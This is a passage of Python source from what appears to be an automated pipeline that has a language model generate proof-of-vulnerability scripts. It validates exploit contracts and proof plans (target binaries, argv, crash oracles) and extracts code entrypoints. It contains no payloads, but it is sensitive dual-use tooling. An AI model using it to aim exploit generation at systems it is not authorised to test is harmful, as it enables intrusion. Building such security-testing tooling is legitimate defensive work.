        inferred_subcommand = self._infer_native_cli_subcommand(target_entrypoint, known_subcommands) if known_subcommands else ''
        plan_subcommand = str(plan.get('subcommand') or inferred_subcommand or '').strip()
        if plan_subcommand and not str(plan.get('subcommand') or '').strip():
            plan['subcommand'] = plan_subcommand
            normalized_contract['proof_plan'] = plan
        setup_requirements = [str(x).strip() for x in self._coerce_listish(normalized_contract.get('setup_requirements')) if str(x).strip()]
        # Generic bootstrap hint: if the binary has any init-style subcommand
        # (keygen, init, setup, etc.) and the plan targets a different subcommand,
        # require key material bootstrapping.  Not enchive-specific.
        _BOOTSTRAP_HINTS = {'keygen', 'init', 'setup', 'configure', 'genkey', 'gen-key', 'generate-key', 'generate_key'}
        if known_subcommands and (_BOOTSTRAP_HINTS & set(known_subcommands)) and plan_subcommand:
            _bootstrap_sub = next(iter(_BOOTSTRAP_HINTS & set(known_subcommands)))
            if plan_subcommand != _bootstrap_sub:
                setup_requirements.append(
                    f'bootstrap key material via `{_bootstrap_sub}` subcommand before trigger execution'
                )
        trigger_requirements = [str(x).strip() for x in self._coerce_listish(normalized_contract.get('trigger_requirements')) if str(x).strip()]
        if target_entrypoint and target_entrypoint.lower() not in {'unknown', 'none', 'n/a'}:
            trigger_requirements.append(f'reach target entrypoint: {target_entrypoint}')
        if plan_subcommand:
            trigger_requirements.append(f'use trigger subcommand: {plan_subcommand}')
        relevance_anchors = [str(x).strip() for x in self._coerce_listish(normalized_contract.get('relevance_anchors')) if str(x).strip()]
        if target_entrypoint and target_entrypoint.lower() not in {'unknown', 'none', 'n/a'} and target_entrypoint not in relevance_anchors:
            relevance_anchors.append(target_entrypoint)
        if plan_subcommand and plan_subcommand not in relevance_anchors:
            relevance_anchors.append(plan_subcommand)
        normalized_contract['setup_requirements'] = list(dict.fromkeys(setup_requirements))
        normalized_contract['trigger_requirements'] = list(dict.fromkeys(trigger_requirements))
        normalized_contract['relevance_anchors'] = list(dict.fromkeys(relevance_anchors))

        execution_requirements = {
            'runtime_family': str(plan.get('runtime_family') or normalized_contract.get('runtime_profile') or '').strip().lower(),
            'execution_surface': str(plan.get('execution_surface') or '').strip().lower(),
            'input_mode': str(plan.get('input_mode') or '').strip().lower(),
            'candidate_input_modes': [str(x).strip().lower() for x in self._coerce_listish(plan.get('candidate_input_modes')) if str(x).strip()],
            'oracle': [str(x).strip() for x in self._coerce_listish(plan.get('oracle')) if str(x).strip()],
            'preflight_checks': [str(x).strip() for x in self._coerce_listish(plan.get('preflight_checks')) if str(x).strip()],
        }
        return {
            'contract': normalized_contract,
            'proof_plan': plan,
            'runtime_feedback': feedback,
            'target_locator': locator,
            'execution_requirements': execution_requirements,
            'inputs': [str(x) for x in self._coerce_listish(normalized_contract.get('inputs')) if str(x).strip()],
            'success_indicators': [str(x) for x in self._coerce_listish(normalized_contract.get('success_indicators')) if str(x).strip()],
            'preconditions': [str(x) for x in self._coerce_listish(normalized_contract.get('preconditions')) if str(x).strip()],
        }

    def audit_handoff(
        self,
        exploit_contract: Optional[Dict[str, Any]],
        cwe_type: str,
        explanation: str,
        vulnerable_code: str,
        filepath: str = '',
        runtime_feedback: Optional[Dict[str, Any]] = None,
        phase: str = 'generation',
    ) -> Dict[str, Any]:
        payload = self.build_handoff_payload(
            exploit_contract,
            cwe_type,
            explanation,
            vulnerable_code,
            filepath=filepath,
            runtime_feedback=runtime_feedback,
        )
        locator = payload['target_locator']
        requirements = payload['execution_requirements']
        issues: List[str] = []
        warnings: List[str] = []

        runtime_family = requirements['runtime_family']
        execution_surface = requirements['execution_surface']
        oracle = requirements['oracle']
        target_entrypoint = locator['target_entrypoint'].lower()
        target_url = locator['target_url']
        observed_target_binary = locator['observed_target_binary']
        observed_target_url = locator['observed_target_url']
        binary_candidates = locator['binary_candidates']

        # ── Task 2: Route on probe_surface_type ───────────────────────────────
        # When the probe successfully discovered the runtime surface of the repo,
        # use that to auto-set execution_surface and relax missing-binary/url checks.
        _contract_dict = exploit_contract or {}
        probe_surface = str(_contract_dict.get('probe_surface_type') or '').lower()
        if probe_surface == 'python_module' and not execution_surface:
            execution_surface = 'repo_script'
        elif probe_surface == 'node_module' and not execution_surface:
            execution_surface = 'repo_script'
        elif probe_surface == 'web_service' and not execution_surface:
            execution_surface = 'http_request'
        elif probe_surface == 'native_elf' and not execution_surface:
            execution_surface = 'binary_cli'
        # If probe resolved a surface, treat missing oracle/surface fields as warnings not blockers
        _probe_resolved_surface = probe_surface in {'python_module', 'node_module', 'web_service', 'native_elf'}

        if not runtime_family:
            issues.append('Exploit contract is missing a runtime family')
        if not execution_surface:
            if _probe_resolved_surface:
                warnings.append('Exploit contract is missing an execution surface (probe resolved surface; proceeding)')
            else:
                issues.append('Exploit contract is missing an execution surface')
        if not oracle:
            if _probe_resolved_surface:
                warnings.append('Exploit contract is missing a concrete oracle (probe resolved surface; using defaults)')
            else:
                issues.append('Exploit contract is missing a concrete oracle')

        # UNCLASSIFIED bypass: when the CWE is unknown but the LLM investigation
        # resolved a concrete target_entrypoint and the finding has reasonable
        # confidence, allow a best-effort proof attempt rather than blocking.
        # The proof will likely produce no oracle signal but can still confirm
        # a crash if the entrypoint is invocable.
        cwe_upper = (cwe_type or '').strip().upper()
        _contract_for_gate = exploit_contract or {}
        _ep_for_gate = str(_contract_for_gate.get('target_entrypoint') or target_entrypoint or '').strip().lower()
        _INVALID_EP = {'', 'unknown', 'none', 'n/a'}
        if cwe_upper == 'UNCLASSIFIED' and _ep_for_gate not in _INVALID_EP and issues:
            # Downgrade all blocking issues to warnings for UNCLASSIFIED findings
            # so generation proceeds on a best-effort basis.
            warnings.extend([f'(UNCLASSIFIED best-effort — demoted blocker) {i}' for i in issues])
            issues = []

        if execution_surface == 'binary_cli':
            if target_entrypoint in {'', 'unknown', 'none', 'n/a'} and not binary_candidates and not observed_target_binary:
                # For library targets (no probe binary found, C/C++ family) demote to warning
                # so generation proceeds with function_harness execution surface.
                # For all other native targets this remains a hard blocker.
                _is_library_target = (
                    str((exploit_contract or {}).get('runtime_profile') or '').lower() in {'c', 'cpp', 'native', 'binary'}
                    and not binary_candidates
                    and not observed_target_binary
                    and not str((exploit_contract or {}).get('probe_binary_path') or '').strip()
                )
                if _is_library_target:
                    warnings.append(
                        'No prebuilt binary found for native target — will attempt function-harness generation; '
                        'verify that target_entrypoint resolves to a real symbol'
                    )
                else:
                    issues.append('Native proof plan is missing a concrete binary or entrypoint for the next proof stage')
            if observed_target_binary and self._source_like_target(observed_target_binary):
                issues.append('Observed native target resolves to a source file instead of a built executable')
        elif execution_surface == 'function_call':
            if target_entrypoint in {'', 'unknown', 'none', 'n/a'} and not target_url:
                issues.append('Exploit contract is missing a concrete target entrypoint for function-level proof execution')
        elif execution_surface in {'http_request', 'browser_dom'}:
            # Relax URL check when probe discovered a base URL or when surface type is web_service
            _has_route = (
                bool(target_url)
                or bool(observed_target_url)
                or str(locator['target_entrypoint']).startswith('/')
                or probe_surface == 'web_service'
                or bool(str(_contract_dict.get('probe_base_url') or '').strip())
            )
            if not _has_route:
                issues.append('Web/browser proof plan is missing a concrete route or target URL')
        elif execution_surface == 'repo_script':
            if runtime_family in {'python', 'node', 'java', 'javascript'} and target_entrypoint in {'', 'unknown', 'none', 'n/a'}:
                warnings.append('Repo-script proof plan does not have a concrete entrypoint; proof will rely on module-level execution or observed runtime feedback')

        if not payload['inputs']:
            warnings.append('Exploit contract does not include any explicit exploit inputs')
        if not payload['success_indicators']:
            warnings.append('Exploit contract does not include explicit success indicators beyond the proof-plan oracle')
        if not requirements['preflight_checks']:
            warnings.append('Proof plan does not define any preflight checks')

        return {
            'is_ready': not issues,
            'issues': issues,
            'warnings': warnings,
            'phase': phase,
            'handoff_payload': payload,
            'normalized_contract': payload['contract'],
        }

    def _contract_gate(self, exploit_contract: dict, runtime_family: str, preflight: Optional[Dict[str, Any]] = None) -> List[str]:
        """Hard stop before PoV generation.

        Returns a list of blocking reasons.  Non-empty list means: do not call
        the model.  All checks are derived from contract fields and preflight
        evidence — no CWE hardcoding.  Gate rules are runtime-family-specific.

        Naming distinction (kept explicit so the gate does not confuse them):
          contract.success_indicators / contract.expected_outcome  — pre-generation,
              set by the contract builder from static analysis + investigation output.
          proof_plan.expected_oracle  — post-generation, filled by the model in its
              JSON plan, used only as a Layer-4 supporting signal in evaluate_proof_outcome.
        """
        blocking: List[str] = []
        contract = exploit_contract or {}
        plan = contract.get('proof_plan') or {}
        family = (runtime_family or '').lower()
        entrypoint = str(contract.get('target_entrypoint') or '').strip().lower()
        _INVALID = {'', 'unknown', 'none', 'n/a', 'vulnerable_binary'}

        # execution_surface must be set at CONTRACT level for browser/live-app.
        # The proof plan must later stay consistent with it but originates here.
        contract_surface = str(contract.get('execution_surface') or '').strip().lower()

        # Per-family required fields
        if family in {'native', 'c', 'cpp', 'binary'}:
            # Any one of three valid native targets is sufficient:
            #   1. A resolved function entrypoint
            #   2. A concrete target_binary
            #   3. execution_surface == 'function_harness'
            has_ep = entrypoint not in _INVALID
            has_binary = bool(str(contract.get('target_binary') or '').strip())
            has_harness = contract_surface == 'function_harness'
            if not has_ep and not has_binary and not has_harness:
                blocking.append(
                    'native target: target_entrypoint, target_binary, and execution_surface '
                    'are all unresolved — cannot generate a targeted PoV'
                )
        elif family in {'python', 'node', 'java', 'javascript'}:
            if entrypoint in _INVALID:
                # For repo_script execution surface, a concrete entrypoint is not strictly
                # required — the PoV can import and test at module level.  Only block for
                # function_call / binary_cli surfaces where the entrypoint must resolve.
                contract_surf = str(contract.get('execution_surface') or '').strip().lower()
                proof_plan_surf = str(plan.get('execution_surface') or '').strip().lower()
                needs_concrete_ep = (contract_surf or proof_plan_surf) in {'function_call', 'binary_cli'}
                if needs_concrete_ep:
                    blocking.append(
                        f'{family} target: target_entrypoint is unknown — '
                        'specify the callable function, class, or entry module'
                    )
        elif family in {'browser', 'web'}:
            # execution_surface must be on the contract, not only the proof plan
            if not contract_surface:
                blocking.append(
                    'browser target: execution_surface (route/DOM trigger) must be set '
                    'on the contract before PoV generation — not only in the proof plan'
                )
        elif family in {'live_app', 'http'}:
            if not contract_surface:
                blocking.append(
                    'live_app target: execution_surface (route or startup surface) must '
                    'be set on the contract before PoV generation'
                )

        # Preflight contradiction check (authoritative — overrides stale contract values)
        if preflight:
            preflight_issues = list(preflight.get('issues') or [])
            if preflight_issues:
                blocking.extend([f'preflight: {i}' for i in preflight_issues])

        # Task 4 — Joern unreachability advisory.
        # If Joern ran and found NO taint path for a statically-strong language
        # (C/C++/Java), downgrade confidence by marking the contract rather than
        # hard-blocking. The contract still proceeds; the advisory is surfaced in
        # the PoV-generation prompt so the model prioritises structural evidence.
        joern_reachable = contract.get('joern_reachable')
        if joern_reachable is False and family in ('c', 'cpp', 'native', 'java', 'binary'):
            contract['joern_unreachable'] = True

        # Pre-generation success signal must exist on the contract.
        # Checks contract.success_indicators / contract.expected_outcome /
        # legacy proof_plan.oracle — NOT the model-filled proof_plan.expected_oracle.
        has_pre_gen_oracle = bool(
            contract.get('success_indicators')
            or contract.get('expected_outcome')
            or plan.get('oracle')  # legacy field name — also accepted
        )
        if not has_pre_gen_oracle:
            blocking.append(
                'contract is missing a pre-generation success signal — '
                'set success_indicators or expected_outcome before PoV generation'
            )

        return blocking

    def _validate_proof_plan(
        self,
        plan: Optional[Dict[str, Any]],
        exploit_contract: Optional[Dict[str, Any]] = None,
        surface_options: Optional[List[str]] = None,
    ) -> List[str]:
        """Validate a model-generated proof plan before accepting the PoV script.

        Returns a list of validation issues.  Non-empty list triggers targeted
        refinement feedback (not full discard) so the model can fix just the plan.

        Uses oracle_policy.validate_expected_oracle for expected_oracle validation.
        """
        from agents.oracle_policy import validate_expected_oracle  # local import to avoid circular
        issues: List[str] = []
        if not plan or not isinstance(plan, dict):
            return ['proof plan is missing or not a JSON object']

        _SUBSTRING_PLACEHOLDERS = {'/path/to/', '<binary>', 'placeholder', 'unknown'}
        _UNFILLED_TOKENS = {'<arg1>', '<arg2>', '<payload>', '<binary>', '/path/to/'}

        # Derive context needed to scope the target_binary requirement
        contract = exploit_contract or {}
        plan_surface = str(plan.get('execution_surface') or '').strip().lower()
        contract_surface = str(contract.get('execution_surface') or '').strip().lower()
        effective_surface = plan_surface or contract_surface
        contract_family = str(
            contract.get('runtime_profile')
            or contract.get('runtime_family')
            or ''
        ).strip().lower()

        # target_binary is required for native CLI proofs but NOT for function_harness
        # surface or for non-native families (browser, http, python, node, etc.).
        native_families = {'native', 'c', 'cpp', 'binary', ''}
        requires_binary = (
            contract_family in native_families
            and effective_surface not in {'function_harness'}
        )

        # target_binary check
        tb = str(plan.get('target_binary') or '').strip()
        if requires_binary:
            if not tb:
                issues.append('proof plan: target_binary is empty')
            elif any(p in tb.lower() for p in _SUBSTRING_PLACEHOLDERS):
                issues.append(f'proof plan: target_binary contains a placeholder: {tb!r}')
        elif tb and any(p in tb.lower() for p in _SUBSTRING_PLACEHOLDERS):
            # Even when not required, a placeholder token is still a problem
            issues.append(f'proof plan: target_binary contains a placeholder: {tb!r}')

        # target_entrypoint consistency with contract
        contract_ep = str(contract.get('target_entrypoint') or '').strip().lower()
        plan_ep = str(plan.get('target_entrypoint') or '').strip().lower()
        if contract_ep and contract_ep not in {'', 'unknown', 'none', 'n/a', 'vulnerable_binary'}:
            if plan_ep and plan_ep != contract_ep and plan_ep not in {'', 'unknown', 'none'}:
                issues.append(
                    f'proof plan: target_entrypoint {plan_ep!r} contradicts '
                    f'contract entrypoint {contract_ep!r}'
                )

        # expected_oracle check
        eo = str(plan.get('expected_oracle') or '').strip()
        if not validate_expected_oracle(eo):
            issues.append(
                f'proof plan: expected_oracle {eo!r} is too generic or empty — '
                'provide a real crash/sanitizer string (e.g. "heap-use-after-free")'
            )

        # why_this_hits_target should mention entrypoint
        why = str(plan.get('why_this_hits_target') or '').lower()
        if plan_ep and len(plan_ep) > 3 and plan_ep not in {'unknown', 'none'} and plan_ep not in why:
            issues.append(
                f'proof plan: why_this_hits_target does not mention the target entrypoint {plan_ep!r}'
            )

        # Detect TARGET_BINARY used as a bare Python name instead of os.environ.get(...)
        # GPT-5.2 and similar models sometimes assign `target = TARGET_BINARY` directly
        # instead of `target = os.environ.get('TARGET_BINARY')`, causing a NameError at
        # runtime before the binary is ever invoked.
        pov_script_hint = str(plan.get('pov_script') or plan.get('script') or '')
        if not pov_script_hint:
            # Fall back to checking exploit_contract fields for embedded script text
            pov_script_hint = str((exploit_contract or {}).get('pov_script') or '')
        if pov_script_hint:
            import re as _re
            # Match bare assignments: `x = TARGET_BINARY` (not `os.environ...TARGET_BINARY`)
            _bare_env_pattern = _re.compile(
                r'(?<!["\'\w])TARGET_(?:BINARY|BIN|URL|HOST)\b(?!\s*[\)\]])'
                r'(?!.*?os\.environ)',
            )
            for _line in pov_script_hint.splitlines():
                _stripped = _line.strip()
                if _stripped.startswith('#'):
                    continue
                # Flag lines that use TARGET_BINARY/TARGET_BIN as a bare name
                # (not inside os.environ.get(...) or os.environ[...])
                if _re.search(r'\bTARGET_(?:BINARY|BIN)\b', _stripped) and \
                        'os.environ' not in _stripped and \
                        'environ.get' not in _stripped and \
                        '= TARGET_' in _stripped:
                    issues.append(
                        "proof plan: pov_script uses TARGET_BINARY as a bare name — "
                        "use os.environ.get('TARGET_BINARY') or os.environ.get('TARGET_BIN') instead"
                    )
                    break

        # argv validation
        argv = list(plan.get('argv') or [])
        has_other_scaffold = any(
            any(tok in str(a) for tok in _UNFILLED_TOKENS)
            for a in argv
        )
        for arg in argv:
            a = str(arg)
            # Unfilled scaffold tokens
            if any(tok in a for tok in _UNFILLED_TOKENS):
                issues.append(
                    f'proof plan: argv contains unfilled scaffold token: {a!r}'
                )
                break
            # Empty string token
            if a == '':
                issues.append('proof plan: argv contains an empty string token')
                break
            # Repeated-character check (e.g. AAAA...) -- ONLY reject when other
            # scaffold smells co-occur in the same argv (legitimate overflow payloads
            # must not be blocked when used standalone).
            if has_other_scaffold and re.fullmatch(r'(.*)\1{2,}', a) and len(a) >= 8:
                issues.append(
                    f'proof plan: argv contains a repeated-char placeholder '
                    f'{a[:20]!r}... alongside other scaffold tokens'
                )
                break

        # Subcommand enforcement for binary_cli native surfaces.
        # Only fires when known_subcommands is set on the contract (evidence-driven).
        if (
            requires_binary
            and effective_surface in {'binary_cli', 'cli', ''}
            and contract_family in native_families
        ):
            known_subcommands = [
                str(s).strip().lower()
                for s in self._coerce_listish(
                    (exploit_contract or {}).get('known_subcommands')  # canonical source
                )
                if str(s).strip()
            ]
            if known_subcommands:
                argv_list = [str(a) for a in self._coerce_listish(plan.get('argv') or [])]
                if not argv_list or argv_list[0].lower() not in known_subcommands:
                    issues.append(
                        f'proof plan: argv[0] must be one of the known subcommands: {known_subcommands}'
                    )

        return issues

    def _proof_plan_binding_issues(self, exploit_contract: Optional[Dict[str, Any]], runtime_feedback: Optional[Dict[str, Any]]) -> List[str]:
        contract = exploit_contract or {}
        plan = contract.get('proof_plan') or {}
        feedback = self._flatten_runtime_feedback(runtime_feedback)
        issues: List[str] = []
        observed_surface = feedback.get('observed_surface') or {}
        surface_options = [str(x) for x in (observed_surface.get('options') or [])]
        input_mode = str(plan.get('input_mode') or '').lower()
        execution_surface = str(plan.get('execution_surface') or '').lower()
        selected_variant = str(feedback.get('selected_variant') or '').lower()
        failure_category = str(feedback.get('failure_category') or '').lower()

        recommended_input_mode = str(feedback.get('recommended_input_mode') or '').lower()
        supported_input_modes = [str(x).lower() for x in (feedback.get('supported_input_modes') or []) if str(x).strip()]

        if execution_surface == 'binary_cli' and input_mode == 'file':
            if selected_variant == 'eval_payload':
                issues.append('Observed runtime feedback shows eval mode for a proof plan that requires file input')
            if not observed_surface.get('supports_positional_file') and not observed_surface.get('include_option') and not observed_surface.get('eval_option'):
                if recommended_input_mode:
                    issues.append(f'Observed target surface does not support file input; switch the proof plan to {recommended_input_mode}')
                else:
                    issues.append('Observed target surface does not support the file-input mode declared in the proof plan')
        if supported_input_modes and input_mode and input_mode not in supported_input_modes and recommended_input_mode:
            issues.append(f'Observed target surface supports {supported_input_modes} and recommends {recommended_input_mode}, but the proof plan still uses {input_mode}')
        if '--memory-limit' in surface_options and failure_category == 'path_exercised_no_oracle' and selected_variant == 'argv_payload':
            issues.append('Observed runtime feedback shows argv payload mode where the target surface suggests a structured option/value invocation is needed')
        return issues

    def _extract_java_entrypoint_with_javalang(self, code: str) -> str:
        """Extract the most relevant Java entrypoint using javalang AST.

        Preference order:
          1. Public methods annotated with Spring/Jakarta web annotations
             (@RequestMapping, @GetMapping, @PostMapping, etc.) — these are the
             actual HTTP-accessible entrypoints that security exploits target.
          2. Any public non-constructor method with meaningful name.
          3. Class name (last resort — enough to route subprocess invocation).

        Falls back to regex extraction if javalang is unavailable or parsing fails.
        """
        if not JAVALANG_AVAILABLE:
            return self._extract_java_entrypoint_regex(code)
        try:
            import javalang  # noqa: F811 — module-level guard already checked
            tree = javalang.parse.parse(code)
            _WEB_ANNOTATIONS = {
                'RequestMapping', 'GetMapping', 'PostMapping', 'PutMapping',
                'DeleteMapping', 'PatchMapping', 'Path', 'GET', 'POST',
                'PUT', 'DELETE', 'PATCH', 'WebServlet',
            }
            # Walk class declarations
            for _, node in tree.filter(javalang.tree.ClassDeclaration):
                for method in (node.methods or []):
                    ann_names = {a.name for a in (method.annotations or [])}
                    if ann_names & _WEB_ANNOTATIONS:
                        name = method.name
                        if name and name.lower() not in self.NATIVE_INVALID_ENTRYPOINTS:
                            return name
            # Fall back to first public non-trivial method
            for _, node in tree.filter(javalang.tree.MethodDeclaration):
                if 'public' in (node.modifiers or set()):
                    name = node.name
                    if name and name.lower() not in self.NATIVE_INVALID_ENTRYPOINTS:
                        return name
            # Last resort: class name
            for _, node in tree.filter(javalang.tree.ClassDeclaration):
                if node.name and node.name.lower() not in self.NATIVE_INVALID_ENTRYPOINTS:
                    return node.name
        except Exception:
            pass
        return self._extract_java_entrypoint_regex(code)

    def _extract_js_entrypoint_with_treesitter(self, code: str, filepath: str = '') -> str:
        """Extract the most relevant JS/TS entrypoint using tree-sitter AST.

        Preference order:
          1. Named export function / exported arrow function (public API surface)
          2. Express/Koa route path (e.g. '/api/users') from app.get/post/use calls
          3. module.exports method name
          4. Any named function / const arrow function

        Falls back to regex extraction if tree-sitter is unavailable or parsing fails.
        """
        if not TREE_SITTER_AVAILABLE:
            return self._extract_js_entrypoint_regex(code, filepath=filepath)
        try:
            ext = Path(filepath or '').suffix.lower()
            if ext in {'.ts'}:
                lang = _TS_TS_LANG
            elif ext in {'.tsx'}:
                lang = _TS_TSX_LANG
            else:
                lang = _TS_JS_LANG
            parser = _TS_Parser(lang)
            raw = code.encode('utf-8', errors='replace') if isinstance(code, str) else code
            tree = parser.parse(raw)

            _INVALID = self.NATIVE_INVALID_ENTRYPOINTS

            def text(node) -> str:
                return raw[node.start_byte:node.end_byte].decode('utf-8', errors='replace').strip()

            # Recursive walk collecting candidates in priority order
            export_names: List[str] = []
            route_paths: List[str] = []
            module_exports: List[str] = []
            func_names: List[str] = []

            def walk(node) -> None:
                t = node.type

                # export function foo() { } / export const foo = () => { }
                if t == 'export_statement':
                    for child in node.children:
                        if child.type == 'function_declaration':
                            name_node = child.child_by_field_name('name')
                            if name_node:
                                n = text(name_node)
                                if n and n.lower() not in _INVALID:
                                    export_names.append(n)
                        elif child.type == 'lexical_declaration':
                            for decl in child.children:
                                if decl.type == 'variable_declarator':
                                    name_node = decl.child_by_field_name('name')
                                    val_node  = decl.child_by_field_name('value')
                                    if (name_node and val_node and
                                            val_node.type in ('arrow_function', 'function')):
                                        n = text(name_node)
                                        if n and n.lower() not in _INVALID:
                                            export_names.append(n)

                # app.get('/route', ...) / router.post('/route', ...)
                elif t == 'call_expression':
                    fn = node.child_by_field_name('function')
                    args = node.child_by_field_name('arguments')
                    if fn and fn.type == 'member_expression':
                        obj  = fn.child_by_field_name('object')
                        prop = fn.child_by_field_name('property')
                        if (obj and prop and
                                text(obj) in {'app', 'router', 'server', 'api'} and
                                text(prop) in {'get', 'post', 'put', 'delete',
                                               'patch', 'use', 'all'}):
                            if args and args.child_count >= 2:
                                first = args.children[1]  # children[0] = '('
                                if first.type in ('string', 'template_string'):
                                    route = text(first).strip("'\"` ")
                                    if route.startswith('/'):
                                        route_paths.append(route)

                # module.exports = { method: ... }
                elif t == 'assignment_expression':
                    left = node.child_by_field_name('left')
                    right = node.child_by_field_name('right')
                    if left and text(left) == 'module.exports' and right:
                        if right.type == 'object':
                            for pair in right.children:
                                if pair.type == 'pair':
                                    key = pair.child_by_field_name('key')
                                    if key:
                                        n = text(key).strip("'\" ")
                                        if n and n.lower() not in _INVALID:
                                            module_exports.append(n)

                # Plain function / const arrow
                elif t == 'function_declaration':
                    name_node = node.child_by_field_name('name')
                    if name_node:
                        n = text(name_node)
                        if n and n.lower() not in _INVALID:
                            func_names.append(n)
                elif t in ('lexical_declaration', 'variable_declaration'):
                    for child in node.children:
                        if child.type == 'variable_declarator':
                            name_node = child.child_by_field_name('name')
                            val_node  = child.child_by_field_name('value')
                            if (name_node and val_node and
                                    val_node.type in ('arrow_function', 'function')):
                                n = text(name_node)
                                if n and n.lower() not in _INVALID:
                                    func_names.append(n)

                for child in node.children:
                    walk(child)

            walk(tree.root_node)

            if export_names:
                return export_names[0]
            if route_paths:
                return route_paths[0]
            if module_exports:
                return module_exports[0]
            if func_names:
                return func_names[0]
        except Exception:
            pass
        return self._extract_js_entrypoint_regex(code, filepath=filepath)

    def _extract_java_entrypoint_regex(self, code: str) -> str:
        """Extract a Java method/class entrypoint using pure regex (no javalang dependency)."""
        # Prefer public methods with meaningful names
        patterns = [
            r'public\s+(?:static\s+)?\w[\w<>\[\],\s]*\s+(\w+)\s*\([^)]*\)\s*(?:throws[^{]+)?\{',
            r'(?:private|protected)\s+(?:static\s+)?\w[\w<>\[\],\s]*\s+(\w+)\s*\([^)]*\)\s*\{',
            r'class\s+(\w+)',
        ]
        for pat in patterns:
            for m in re.finditer(pat, code):
                name = m.group(1)
                if name and name.lower() not in self.NATIVE_INVALID_ENTRYPOINTS:
                    return name
        return 'unknown'

    def _extract_js_entrypoint_regex(self, code: str, filepath: str = '') -> str:
        """Extract a JavaScript/TypeScript entrypoint using pure regex (no tree-sitter dependency)."""
        patterns = [
            # Named exports: export function foo() / export const foo = () =>
            r'export\s+(?:default\s+)?(?:async\s+)?function\s+(\w+)\s*\(',
            r'export\s+(?:const|let|var)\s+(\w+)\s*=\s*(?:async\s*)?(?:\([^)]*\)|\w+)\s*=>',
            # module.exports = { methodName }
            r'module\.exports\s*=\s*\{[^}]*?(\w+)\s*:',
            # Express / Koa routes: app.get('/route', handler) → extract route
            r"(?:app|router)\.(?:get|post|put|delete|patch|use)\s*\(\s*['\"]([^'\"]+)['\"]",
            # Named functions
            r'(?:const|let|var)\s+(\w+)\s*=\s*(?:async\s*)?function\s*\(',
            r'(?:const|let|var)\s+(\w+)\s*=\s*(?:async\s*)?(?:\([^)]*\)|\w+)\s*=>',
            r'function\s+(\w+)\s*\(',
        ]
        for pat in patterns:
            for m in re.finditer(pat, code):
                name = m.group(1)
                if name and name.lower() not in self.NATIVE_INVALID_ENTRYPOINTS:
                    return name
        return 'unknown'

    def _extract_target_entrypoint_candidates(
        self,
        vulnerable_code: str,
        filepath: str,
        probe_binary_name: str = '',
    ) -> List[str]:
        """Return a ranked list of entrypoint candidates derived purely from code and probe data.

        Rank order (highest first):
          1. AST/regex-extracted function names from the code chunk
          2. Probe-discovered binary name (the actual built executable)
          3. 'main' (universal C/C++ fallback for native targets)

        Duplicates and invalid values are removed.  The list is never empty.
        Callers should store this as exploit_contract['entrypoint_candidates'] so the
        refinement loop can promote through candidates when the current one yields
        no oracle match.
        """
        seen: set = set()
        candidates: List[str] = []

        def _add(val: str) -> None:
            v = str(val or '').strip()
            if v and v.lower() not in self.NATIVE_INVALID_ENTRYPOINTS and v not in seen:
                seen.add(v)
                candidates.append(v)

        code = str(vulnerable_code or '')
        ext = Path(filepath or '').suffix.lower()

        # ── Rank 1: language-aware AST extraction ──────────────────────────────
        if ext == '.java':
            c = self._extract_java_entrypoint_with_javalang(code)
            if c and c != 'unknown':
                _add(c)
        if ext in {'.js', '.jsx', '.ts', '.tsx'}:
            c = self._extract_js_entrypoint_with_treesitter(code, filepath=filepath)
            if c and c != 'unknown':
                _add(c)

        native_sig_patterns = [
            r'\b(?:static\s+)?(?:inline\s+)?(?:const\s+)?(?:struct\s+)?(?:[A-Za-z_]\w*\s+)*[A-Za-z_]\w*(?:\s*\*+)?\s+([A-Za-z_]\w*)\s*\([^;{}]*\)\s*\{',
            r'\b([A-Za-z_]\w*)\s*\([^;{}]*\)\s*\{',
        ]
        for pat in native_sig_patterns:
            for m in re.finditer(pat, code):
                _add(m.group(1))

        other_patterns = [
            r'def\s+(\w+)\s*\(',
            r'function\s+(\w+)\s*\(',
            r'(?:const|let|var)\s+(\w+)\s*=\s*(?:async\s*)?function\s*\(',
            r'(?:const|let|var)\s+(\w+)\s*=\s*(?:async\s*)?(?:\([^)]*\)|[A-Za-z_]\w*)\s*=>',
            r'export\s+(?:const|let|var)\s+(\w+)\s*=\s*(?:async\s*)?(?:\([^)]*\)|[A-Za-z_]\w*)\s*=>',
            r'export\s+(?:async\s+)?function\s+(\w+)\s*\(',
            r'(?:public|private|protected)\s+(?:static\s+)?[\w<>\[\],\s]+\s+(\w+)\s*\([^;]*\)\s*\{',
            r"""(?:app|router)\.(?:get|post|put|delete|patch|use)\s*\(\s*['"]([^'"]+)['"]""",
        ]
        for pat in other_patterns:
            m = re.search(pat, code)
            if m:
                _add(m.group(1))

        # ── Rank 2: probe-discovered binary name ───────────────────────────────
        # The binary name is the actual executable built from the repo; it is the
        # most reliable relevance anchor when code-level extraction fails.
        if probe_binary_name:
            _add(str(probe_binary_name).strip())

        # ── Rank 3: universal C/C++ fallback ───────────────────────────────────
        # 'main' is always callable in a native binary; it will at least let the
        # oracle check exit-code anomaly and stderr divergence.
        if ext in {'.c', '.h', '.cc', '.cpp', '.cxx', '.hpp'} or not ext:
            _add('main')

        # Always have at least one candidate
        if not candidates:
            _add(probe_binary_name or 'main')

        return candidates

    def _extract_target_entrypoint(self, vulnerable_code: str, filepath: str) -> str:
        """Return the single best entrypoint candidate (first item from ranked list)."""
        candidates = self._extract_target_entrypoint_candidates(
            vulnerable_code, filepath, probe_binary_name=''
        )
        # Filter out 'main' as a function-level entrypoint for non-C/C++ (kept only as
        # a CLI-level anchor for native targets); return 'unknown' for other languages.
        best = candidates[0] if candidates else 'unknown'
        return best if best.lower() not in self.NATIVE_INVALID_ENTRYPOINTS else 'unknown'


    def _static_extract_enclosing_function(self, codebase_path: str, filepath: str, line_number: int) -> str:
        """Walk backward from `line_number` in the actual source file to find the
        enclosing C/C++ function name using a pure-regex scan.  This is deterministic
        and LLM-free, so it is used for CodeQL findings where the function name
        must always be derived from the source rather than hallucinated.

        Returns the function name string, or '' if extraction fails.
        """
        if not codebase_path or not filepath or not line_number:
            return ''
        ext = Path(filepath or '').suffix.lower()
        if ext not in {'.c', '.h', '.cc', '.cpp', '.cxx', '.hpp'}:
            return ''

        # Resolve absolute path: try as-is first, then join with codebase root.
        abs_path = filepath if os.path.isabs(filepath) else os.path.join(codebase_path, filepath)
        if not os.path.isfile(abs_path):
            # Strip leading path separators and retry
            stripped = filepath.lstrip('/\\')
            abs_path = os.path.join(codebase_path, stripped)
        if not os.path.isfile(abs_path):
            return ''

        try:
            with open(abs_path, 'r', encoding='utf-8', errors='replace') as fh:
                lines = fh.readlines()
        except OSError:
            return ''

        # Walk backward from the reported line (1-based; convert to 0-based index).
        # Stop after 200 lines to avoid crossing into an unrelated function.
